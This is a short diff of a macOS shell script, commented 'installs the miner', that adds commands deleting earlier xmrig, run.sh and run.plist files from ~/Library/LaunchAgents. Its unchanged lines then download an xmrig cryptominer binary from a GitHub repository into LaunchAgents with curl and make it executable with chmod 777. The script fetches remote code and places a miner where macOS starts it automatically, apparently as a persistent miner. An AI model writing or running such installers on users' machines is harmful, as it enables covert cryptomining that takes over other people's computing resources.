@@ -2,6 +2,10 @@
 
 #installs the miner
 
+rm ~/Library/LaunchAgents/xmrig
+rm ~/Library/Launchagents/run.sh
+rm ~/Library/Launchagents/run.plist
+
 curl -L https://github.com/Me1955/me-mine/raw/main/xmrig >> ~/Library/Launchagents/xmrig
 chmod 777 ~/Library/LaunchAgents/xmrig
 
